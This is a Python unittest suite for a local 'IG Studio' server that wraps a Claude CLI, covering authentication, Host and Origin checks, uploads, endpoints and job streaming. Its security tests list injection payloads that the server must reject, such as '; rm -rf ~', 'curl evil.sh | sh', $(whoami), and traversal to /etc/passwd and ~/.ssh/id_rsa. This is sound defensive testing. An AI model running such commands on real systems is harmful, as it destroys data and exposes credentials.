"""IG Studio server tests. Temp IG_HOME and a fake claude only; never the real data.

    cd app && python3 -m unittest discover -s tests
"""
import http.client
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
APP = os.path.dirname(HERE)
sys.path.insert(0, APP)
sys.path.insert(0, HERE)

import server  # noqa: E402
import seed_demo  # noqa: E402

SKILLS = os.path.expanduser(os.environ.get("IG_SKILLS_DIR") or "~/.claude/skills")
HAVE_SKILLS = os.path.isfile(os.path.join(SKILLS, "ig", "state.py"))
TOKEN = "test-token-0123456789abcdef"


class Base(unittest.TestCase):
    FULL_SEED = False

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="igstudio-test-")
        cls.home = os.path.join(cls.tmp, "ighome")
        cls.studio = os.path.join(cls.tmp, "studio")
        cls.fake_log = os.path.join(cls.tmp, "fake-claude.jsonl")
        fake = os.path.join(cls.tmp, "fake_claude.py")
        shutil.copy(os.path.join(HERE, "fake_claude.py"), fake)
        os.chmod(fake, os.stat(fake).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        cls._env = dict(os.environ)
        os.environ.pop("IG_DATA_DIR", None)
        os.environ.update({"IG_HOME": cls.home, "IG_STUDIO_HOME": cls.studio, "IG_CLAUDE_BIN": fake,
                           "FAKE_CLAUDE_LOG": cls.fake_log, "IG_STUDIO_NO_OPEN": "1"})
        if HAVE_SKILLS:
            cls.data = seed_demo.seed(cls.home, bare=not cls.FULL_SEED)
        else:
            cls.data = cls.home
            os.makedirs(cls.home, exist_ok=True)
        assert os.path.realpath(server.data_dir()).startswith(os.path.realpath(cls.tmp))
        cls.srv = server.make_server(0, TOKEN)
        cls.port = cls.srv.port
        cls.thread = threading.Thread(target=cls.srv.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown_all()
        cls.srv.shutdown()
        cls.srv.server_close()
        os.environ.clear()
        os.environ.update(cls._env)
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def req(self, method, path, body=None, token=TOKEN, host=None, headers=None, raw=None):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=60)
        hd = {"Host": host or f"127.0.0.1:{self.port}"}
        if token:
            hd["X-IG-Token"] = token
        data = raw
        if body is not None:
            data = json.dumps(body).encode()
            hd["Content-Type"] = "application/json"
        hd.update(headers or {})
        c.request(method, path, body=data, headers=hd)
        r = c.getresponse()
        payload = r.read()
        c.close()
        try:
            j = json.loads(payload.decode())
        except (ValueError, UnicodeDecodeError):
            j = None
        return r.status, j, r, payload

    def events(self, job_id, timeout=60):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=timeout)
        c.request("GET", f"/api/jobs/{job_id}/events", headers={"Host": f"127.0.0.1:{self.port}", "X-IG-Token": TOKEN})
        r = c.getresponse()
        self.assertEqual(r.status, 200)
        self.assertIn("text/event-stream", r.getheader("Content-Type"))
        evs, buf = [], b""
        while True:
            chunk = r.read1(65536) if hasattr(r, "read1") else r.read(1)
            if not chunk:
                break
            buf += chunk
            while b"\n\n" in buf:
                block, buf = buf.split(b"\n\n", 1)
                for line in block.decode().splitlines():
                    if line.startswith("data: "):
                        evs.append(json.loads(line[6:]))
            if evs and evs[-1]["type"] == "end":
                break
        c.close()
        return evs

    def fake_calls(self):
        try:
            with open(self.fake_log, encoding="utf-8") as f:
                return [json.loads(l) for l in f if l.strip()]
        except OSError:
            return []


class SecurityTests(Base):
    def test_token_required(self):
        self.assertEqual(self.req("GET", "/api/ping", token=None)[0], 401)
        self.assertEqual(self.req("GET", "/api/ping", token="wrong")[0], 401)
        st, j, _, _ = self.req("GET", "/api/ping")
        self.assertEqual(st, 200)
        self.assertEqual(j["app"], "ig-studio")

    def test_host_header_checked(self):
        self.assertEqual(self.req("GET", "/api/ping", host="evil.example:80")[0], 403)
        self.assertEqual(self.req("GET", "/api/ping", host=f"evil.example:{self.port}")[0], 403)
        self.assertEqual(self.req("GET", "/", host="attacker.test")[0], 403)
        self.assertEqual(self.req("GET", "/api/ping", host=f"localhost:{self.port}")[0], 200)

    def test_cross_origin_rejected(self):
        st = self.req("GET", "/api/ping", headers={"Origin": "http://evil.example"})[0]
        self.assertEqual(st, 403)
        st = self.req("GET", "/api/ping", headers={"Origin": f"http://127.0.0.1:{self.port}"})[0]
        self.assertEqual(st, 200)

    def test_no_cors_headers(self):
        _, _, r, _ = self.req("GET", "/api/ping")
        self.assertIsNone(r.getheader("Access-Control-Allow-Origin"))

    def test_static_index_has_csp(self):
        st, _, r, body = self.req("GET", "/", token=None)
        self.assertEqual(st, 200)
        self.assertIn("script-src 'self'", r.getheader("Content-Security-Policy"))
        self.assertIn(b"IG Studio", body)
        self.assertEqual(self.req("GET", "/../server.py", token=None)[0], 404)
        self.assertEqual(self.req("GET", "/%2e%2e/server.py", token=None)[0], 404)

    def test_path_traversal_blocked(self):
        for p in ("../../../../etc/passwd", "/etc/passwd", "~/.ssh/id_rsa", self.data + "/../../../etc/hosts"):
            st = self.req("GET", "/api/file?" + urllib.parse.urlencode({"path": p}))[0]
            self.assertIn(st, (403, 404), p)
            self.assertNotEqual(st, 200)
        link = os.path.join(self.data, "sneaky-link.txt")
        try:
            os.symlink("/etc/hosts", link)
            st = self.req("GET", "/api/file?" + urllib.parse.urlencode({"path": link}))[0]
            self.assertEqual(st, 403)
        finally:
            if os.path.lexists(link):
                os.remove(link)

    def test_file_serving_and_signatures(self):
        p = os.path.join(self.data, "hello.txt")
        with open(p, "w") as f:
            f.write("0123456789")
        st, _, r, body = self.req("GET", "/api/file?" + urllib.parse.urlencode({"path": p}))
        self.assertEqual(st, 200)
        self.assertEqual(body, b"0123456789")
        self.assertTrue(r.getheader("Content-Type").startswith("text/plain"))
        st, _, r, body = self.req("GET", "/api/file?" + urllib.parse.urlencode({"path": p}), headers={"Range": "bytes=2-5"})
        self.assertEqual(st, 206)
        self.assertEqual(body, b"2345")
        self.assertEqual(r.getheader("Content-Range"), "bytes 2-5/10")
        signed = self.srv.file_url(p)
        self.assertEqual(self.req("GET", signed, token=None)[0], 200)
        forged = "/api/file?" + urllib.parse.urlencode({"path": "/etc/passwd", "sig": self.srv.sign(os.path.realpath(p))})
        self.assertEqual(self.req("GET", forged, token=None)[0], 401)
        html = os.path.join(self.data, "x.html")
        with open(html, "w") as f:
            f.write("<script>alert(1)</script>")
        _, _, r, _ = self.req("GET", "/api/file?" + urllib.parse.urlencode({"path": html}))
        self.assertIn("attachment", r.getheader("Content-Disposition"))
        self.assertEqual(r.getheader("Content-Type"), "application/octet-stream")


class UploadTests(Base):
    def test_sanitize_filename(self):
        s = server.sanitize_filename
        self.assertEqual(s("../../etc/passwd.png", {".png"}), "passwd.png")
        self.assertEqual(s("..\\..\\win\\evil.PNG", {".png"}), "evil.png")
        self.assertEqual(s("my reel (final).MOV", {".mov"}), "my-reel-final.mov")
        self.assertEqual(s("évènement.jpg", {".jpg"}), "evenement.jpg")
        self.assertEqual(s(".bashrc", {".png"}), "")
        self.assertEqual(s("run.sh", {".png"}), "")
        self.assertEqual(s("CON.png", {".png"}), "_CON.png")
        self.assertEqual(s("a\x00b.png", {".png"}), "a-b.png")

    def test_upload_saved_inside_uploads(self):
        name = urllib.parse.quote("../../../tmp/x y<script>.png")
        st, j, _, _ = self.req("POST", f"/api/upload?kind=image&name={name}", raw=b"\x89PNG fake")
        self.assertEqual(st, 200, j)
        self.assertTrue(os.path.realpath(j["path"]).startswith(os.path.realpath(os.path.join(self.data, "uploads")) + os.sep))
        self.assertRegex(os.path.basename(j["path"]), r"^[A-Za-z0-9._-]+\.png$")
        st, j2, _, _ = self.req("POST", f"/api/upload?kind=image&name={name}", raw=b"second")
        self.assertNotEqual(j["path"], j2["path"])

    def test_upload_rejects_bad_type_and_size(self):
        self.assertEqual(self.req("POST", "/api/upload?kind=image&name=evil.sh", raw=b"#!/bin/sh")[0], 400)
        self.assertEqual(self.req("POST", "/api/upload?kind=exe&name=a.png", raw=b"x")[0], 400)
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        c.putrequest("POST", "/api/upload?kind=image&name=big.png", skip_host=True)
        c.putheader("Host", f"127.0.0.1:{self.port}")
        c.putheader("X-IG-Token", TOKEN)
        c.putheader("Content-Length", str(21 * 1024 * 1024))
        c.endheaders()
        r = c.getresponse()
        self.assertEqual(r.status, 413)
        c.close()


@unittest.skipUnless(HAVE_SKILLS, "ig skills not installed")
class EndpointTests(Base):
    FULL_SEED = True

    def test_state(self):
        st, j, _, _ = self.req("GET", "/api/state?quick=1")
        self.assertEqual(st, 200, j)
        self.assertEqual(j["account"], "demo.creator")
        self.assertTrue(os.path.realpath(j["data_dir"]).startswith(os.path.realpath(self.tmp)))
        self.assertIn(j["stage"], ("setup", "run"))
        self.assertIsInstance(j["next"], list)

    def test_profile_set(self):
        st, j, _, _ = self.req("POST", "/api/profile", {"region": "GB", "niche": "plants", "account_type": "creator"})
        self.assertEqual(st, 200, j)
        self.assertEqual(j["profile"]["region"], "GB")
        self.assertEqual(self.req("POST", "/api/profile", {"account_type": "robot"})[0], 400)
        self.req("POST", "/api/profile", {"region": "IN", "niche": "contracts and pricing for freelance designers", "account_type": "creator"})

    def test_accounts(self):
        st, j, _, _ = self.req("GET", "/api/accounts")
        self.assertEqual(st, 200)
        self.assertEqual(j["active"], "demo.creator")
        self.assertEqual(self.req("POST", "/api/accounts/new", {"handle": "../evil"})[0], 400)

    def test_ledger_and_perf(self):
        st, j, _, _ = self.req("POST", "/api/ledger/add", {"format": "reel", "first_line": "--views=999 not a flag", "theme": "test"})
        self.assertEqual(st, 200, j)
        pid = j["id"]
        self.assertRegex(pid, r"^P\d+$")
        st, j, _, _ = self.req("GET", "/api/ledger")
        row = [p for p in j["posts"] if p["id"] == pid][0]
        self.assertEqual(row["first_line"], "--views=999 not a flag")
        self.assertEqual(row["views"], "")
        st, j, _, _ = self.req("POST", "/api/perf/check", {"id": pid, "views": "1200", "reach": "1000", "shares": "9", "hours": "1"})
        self.assertEqual(st, 200, j)
        self.assertEqual(j["snapshot"]["views"], "1200")
        st, j, _, _ = self.req("GET", f"/api/perf/status?id={pid}")
        self.assertEqual(st, 200, j)
        self.assertEqual(j["post_id"], pid)
        st, j, _, _ = self.req("GET", "/api/perf/due")
        self.assertEqual(st, 200)
        self.assertIsInstance(j["due"], list)
        self.assertEqual(self.req("GET", "/api/perf/status?id=../x")[0], 400)
        st, j, _, _ = self.req("GET", "/api/audit")
        self.assertEqual(st, 200)
        self.assertIn("median_views", j)

    def test_grow(self):
        st, j, _, _ = self.req("POST", "/api/grow/checkin", {"followers": "1,700"})
        self.assertEqual(st, 200, j)
        self.assertEqual(j["row"]["followers"], 1700)
        self.assertEqual(self.req("POST", "/api/grow/checkin", {"followers": "lots"})[0], 400)
        for p in ("/api/grow/report", "/api/grow/plan", "/api/grow/milestones", "/api/grow/series"):
            st, j, _, _ = self.req("GET", p)
            self.assertEqual(st, 200, (p, j))
        st, j, _, _ = self.req("GET", "/api/grow/series")
        self.assertGreaterEqual(len(j["points"]), 2)

    def test_trends_audio_calendar(self):
        st, j, _, _ = self.req("POST", "/api/trends/blend", {"no_write": True})
        self.assertEqual(st, 200, j)
        self.assertIn("board", j)
        self.assertEqual(self.req("GET", "/api/trends")[0], 200)
        st, j, _, _ = self.req("POST", "/api/audio/suggest", {"reel_length": "20", "mood": "upbeat"})
        self.assertEqual(st, 200, j)
        st, j, _, _ = self.req("GET", "/api/calendar")
        self.assertEqual(st, 200, j)
        self.assertTrue(j["exists"])
        self.assertGreater(len(j["parsed"]["events"]), 0)
        st, j, _, _ = self.req("POST", "/api/calendar/ics", {})
        self.assertEqual(st, 200, j)
        self.assertTrue(os.path.isfile(j["path"]))
        self.assertEqual(self.req("POST", "/api/calendar/ics", {"tz": "Europe/London; rm -rf"})[0], 400)

    def test_tools(self):
        st, j, _, _ = self.req("POST", "/api/tools/hookscore", {"hooks": "Nobody tells you this\nI lost $18,000 on one line"})
        self.assertEqual(st, 200, j)
        self.assertEqual(len(j["hooks"]), 2)
        self.assertGreaterEqual(j["hooks"][0]["score"], j["hooks"][1]["score"])
        st, j, _, _ = self.req("POST", "/api/tools/beats", {"script": "Line one.\nLine two is here.", "target": "20"})
        self.assertEqual(st, 200, j)
        st, j, _, _ = self.req("POST", "/api/tools/caption", {"caption": "A caption.\n\n#one #two", "keywords": "one"})
        self.assertEqual(st, 200, j)
        self.assertIn("visible", j)
        st, j, _, _ = self.req("POST", "/api/tools/humanize", {"text": "Let us delve into the tapestry — it is crucial."})
        self.assertEqual(st, 200, j)
        self.assertNotIn("—", j["text"])
        self.assertIn("human_score", j["before"])

    def test_abtest(self):
        st, j, _, _ = self.req("POST", "/api/abtest/new", {"a": "Hook one here", "b": "Hook two here"})
        self.assertEqual(st, 200, j)
        tid = j["test_id"]
        st, j, _, _ = self.req("POST", "/api/abtest/record", {"test_id": tid, "variant": "A", "views": "1000", "shares": "12"})
        self.assertEqual(st, 200, j)
        self.assertEqual(self.req("GET", f"/api/abtest/report?id={tid}")[0], 200)

    @unittest.skipUnless(os.path.isfile(os.path.join(SKILLS, "ig-scan", "scan.py")), "ig-scan not installed")
    def test_scan(self):
        st, j, _, _ = self.req("GET", "/api/scan")
        self.assertEqual(st, 200, j)
        self.assertTrue(j["available"])
        self.assertTrue(j["has_analysis"])
        st, j, _, _ = self.req("POST", "/api/scan/prefill")
        self.assertEqual(st, 200, j)
        self.assertIn("fields", j)
        st, j, _, _ = self.req("POST", "/api/scan/to-ledger", {"dry_run": True})
        self.assertEqual(st, 200, j)

    @unittest.skipUnless(shutil.which("ffmpeg"), "ffmpeg not installed")
    def test_video_edit_job_and_cover(self):
        src = os.path.join(self.data, "uploads", "clip.mp4")
        os.makedirs(os.path.dirname(src), exist_ok=True)
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc=size=640x360:rate=30",
                        "-f", "lavfi", "-i", "sine=frequency=440:sample_rate=48000", "-t", "3", "-c:v", "libx264",
                        "-c:a", "aac", src], check=True)
        self.assertEqual(self.req("POST", "/api/video/edit", {"path": "/etc/passwd"})[0], 403)
        self.assertEqual(self.req("POST", "/api/video/edit", {"path": src, "start": "1; rm"})[0], 400)
        st, j, _, _ = self.req("POST", "/api/video/edit", {"path": src, "hook_text": "TEST -> HOOK", "preset": "veryfast", "captions": "none"})
        self.assertEqual(st, 200, j)
        evs = self.events(j["job"], timeout=300)
        self.assertEqual(evs[-1]["status"], "done", evs[-5:])
        res = [e for e in evs if e["type"] == "result"][0]["data"]
        self.assertTrue(os.path.isfile(res["video"]["path"]))
        st, _, r, body = self.req("GET", res["video"]["url"], token=None, headers={"Range": "bytes=0-99"})
        self.assertEqual(st, 206)
        self.assertEqual(r.getheader("Content-Type"), "video/mp4")
        self.assertEqual(len(body), 100)
        st, j, _, _ = self.req("POST", "/api/video/cover", {"video": res["video"]["path"], "at": 1.0})
        self.assertEqual(st, 200, j)
        self.assertTrue(os.path.isfile(j["cover"]))

    @unittest.skipUnless(server.find_chrome(), "Chrome not installed")
    def test_render_job(self):
        spec = {"kind": "carousel", "handle": "@demo", "slides": [{"role": "cover", "title": "Hello"}, {"title": "Two", "body": "Body"}]}
        st, j, _, _ = self.req("POST", "/api/render", {"spec": spec})
        self.assertEqual(st, 200, j)
        evs = self.events(j["job"], timeout=180)
        self.assertEqual(evs[-1]["status"], "done", evs[-5:])
        res = [e for e in evs if e["type"] == "result"][0]["data"]
        self.assertGreaterEqual(len(res["files"]), 2)
        st, _, r, body = self.req("GET", res["zip"], token=None)
        self.assertEqual(st, 200)
        self.assertEqual(r.getheader("Content-Type"), "application/zip")
        self.assertEqual(self.req("POST", "/api/render", {"spec": {"kind": "carousel", "slides": [{}] * 21}})[0], 400)


class JobTests(Base):
    def chat(self, prompt, sid=None):
        st, j, _, _ = self.req("POST", "/api/chat", {"prompt": prompt, "session_id": sid})
        self.assertEqual(st, 200, j)
        return self.events(j["job"])

    def test_chat_stream_and_resume(self):
        evs = self.chat("score these hooks")
        types = [e["type"] for e in evs]
        self.assertEqual(types[-1], "end")
        self.assertEqual(evs[-1]["status"], "done", evs[-3:])
        self.assertIn("session", types)
        self.assertIn("tool", types)
        self.assertIn("tool_done", types)
        tool = [e for e in evs if e["type"] == "tool"][0]
        self.assertEqual(tool["summary"], "Running hookscore.py")
        text = "".join(e["text"] for e in evs if e["type"] == "text")
        self.assertEqual(text, "Hook A wins with 87.")
        self.assertEqual([e["seq"] for e in evs], list(range(len(evs))))
        sid = [e for e in evs if e["type"] == "session"][0]["session_id"]
        calls = self.fake_calls()
        args = calls[-1]["args"]
        self.assertIn("-p", args)
        self.assertEqual(args[args.index("--output-format") + 1], "stream-json")
        self.assertIn("--verbose", args)
        allowed = args[args.index("--allowedTools") + 1].split(",")
        self.assertIn("Bash(python3:*)", allowed)
        self.assertIn("mcp__kweo__browser_read", allowed)
        self.assertNotIn("mcp__kweo__browser_run_task", allowed)
        self.assertFalse(any("delete" in t for t in allowed))
        self.assertIn("mcp__kweo__browser_run_task", args[args.index("--disallowedTools") + 1])
        self.assertNotIn("bypassPermissions", args)
        self.assertNotIn("--dangerously-skip-permissions", args)
        self.assertEqual(os.path.realpath(calls[-1]["cwd"]), os.path.realpath(server.data_dir()))
        self.assertEqual(calls[-1]["prompt"], "score these hooks")
        evs2 = self.chat("yes", sid)
        self.assertEqual(evs2[-1]["status"], "done")
        args2 = self.fake_calls()[-1]["args"]
        self.assertEqual(args2[args2.index("--resume") + 1], sid)
        self.assertTrue("".join(e["text"] for e in evs2 if e["type"] == "text").startswith("Resumed."))

    def test_chat_reports_new_files_and_attachments(self):
        img = os.path.join(server.data_dir(), "uploads", "shot.png")
        os.makedirs(os.path.dirname(img), exist_ok=True)
        with open(img, "wb") as f:
            f.write(b"png")
        st, j, _, _ = self.req("POST", "/api/chat", {"prompt": "MAKEFILE please", "attachments": [img]})
        self.assertEqual(st, 200, j)
        evs = self.events(j["job"])
        files = [e for e in evs if e["type"] == "file"]
        self.assertTrue(any(e["name"] == "fake-slide.png" and e["kind"] == "image" for e in files), evs)
        self.assertIn(img, self.fake_calls()[-1]["prompt"])
        st, _, _, _ = self.req("POST", "/api/chat", {"prompt": "x", "attachments": ["/etc/passwd"]})
        self.assertEqual(st, 403)

    def test_chat_error(self):
        evs = self.chat("FAIL now")
        self.assertEqual(evs[-1]["status"], "error")
        self.assertIn("Something broke", evs[-1]["error"])

    def test_cancel_kills_process(self):
        st, j, _, _ = self.req("POST", "/api/chat", {"prompt": "SLOW please"})
        jid = j["job"]
        time.sleep(1.0)
        t0 = time.time()
        self.assertEqual(self.req("POST", f"/api/jobs/{jid}/cancel", {})[0], 200)
        evs = self.events(jid, timeout=30)
        self.assertEqual(evs[-1]["status"], "cancelled")
        self.assertLess(time.time() - t0, 15)
        self.assertEqual(self.req("GET", "/api/jobs/0123456789abcdef/events")[0], 404)

    def test_sse_resume_from_offset(self):
        st, j, _, _ = self.req("POST", "/api/chat", {"prompt": "hi"})
        full = self.events(j["job"])
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=30)
        c.request("GET", f"/api/jobs/{j['job']}/events?from=3", headers={"Host": f"127.0.0.1:{self.port}", "X-IG-Token": TOKEN})
        body = c.getresponse().read().decode()
        seqs = [json.loads(l[6:])["seq"] for l in body.splitlines() if l.startswith("data: ")]
        self.assertEqual(seqs, list(range(3, len(full))))


class KweoTests(Base):
    GOOD = 'claude mcp add kweo --transport http http://127.0.0.1:7333/mcp --header "Authorization: Bearer abcDEF123._-~+/="'

    def test_validation_accepts_exact_pattern(self):
        v = server.validate_kweo_command
        self.assertEqual(v(self.GOOD), "abcDEF123._-~+/=")
        self.assertEqual(v("  " + self.GOOD + "\n"), "abcDEF123._-~+/=")
        self.assertEqual(v(self.GOOD.replace('"', "'")), "abcDEF123._-~+/=")
        self.assertEqual(v("! " + self.GOOD), "abcDEF123._-~+/=")

    def test_validation_rejects_injection(self):
        v = server.validate_kweo_command
        bad = [
            self.GOOD + "; rm -rf ~",
            self.GOOD + " && curl evil.sh | sh",
            self.GOOD.replace("abcDEF123", "abc`id`DEF"),
            self.GOOD.replace("abcDEF123", "$(whoami)abc"),
            self.GOOD.replace("127.0.0.1:7333", "evil.example:7333"),
            self.GOOD.replace("127.0.0.1:7333", "127.0.0.1:7334"),
            self.GOOD.replace("http://", "https://"),
            self.GOOD.replace("mcp add kweo", "mcp add other"),
            self.GOOD.replace("claude mcp", "/tmp/claude mcp"),
            self.GOOD + " --scope project",
            self.GOOD + "\nrm -rf ~",
            self.GOOD.replace("Bearer abcDEF123._-~+/=", "Bearer short"),
            "", None, 42,
        ]
        for b in bad:
            self.assertIsNone(v(b), repr(b))

    def test_connect_endpoint_runs_arg_list(self):
        before = len(self.fake_calls())
        st, j, _, _ = self.req("POST", "/api/kweo/connect", {"command": self.GOOD + " ; echo pwned"})
        self.assertEqual(st, 400)
        self.assertEqual(len(self.fake_calls()), before)
        st, j, _, _ = self.req("POST", "/api/kweo/connect", {"command": self.GOOD})
        self.assertEqual(st, 200, j)
        self.assertNotIn("abcDEF123", json.dumps(j))
        call = self.fake_calls()[-1]
        self.assertEqual(call["args"], ["mcp", "add", "--scope", "user", "kweo", "--transport", "http",
                                        "http://127.0.0.1:7333/mcp", "--header", "Authorization: Bearer abcDEF123._-~+/="])


class LockTests(Base):
    def test_single_instance_lock(self):
        server.write_lock(self.port, TOKEN)
        mode = os.stat(server.lock_file()).st_mode & 0o777
        self.assertEqual(mode, 0o600)
        lk = server.running_instance()
        self.assertIsNotNone(lk)
        self.assertEqual(lk["port"], self.port)
        # A second launch reuses the running one and does not bind a new server.
        r = subprocess.run([sys.executable, os.path.join(APP, "server.py"), "--no-browser"], capture_output=True,
                           text=True, timeout=30, env=dict(os.environ))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("already running", r.stdout)
        self.assertIn(str(self.port), r.stdout)
        # A stale lock (dead port) is ignored.
        server.write_lock(1, "stale-token")
        self.assertIsNone(server.running_instance())
        server.release_lock("other-token")
        self.assertTrue(os.path.exists(server.lock_file()))
        server.release_lock("stale-token")
        self.assertFalse(os.path.exists(server.lock_file()))


if __name__ == "__main__":
    unittest.main()
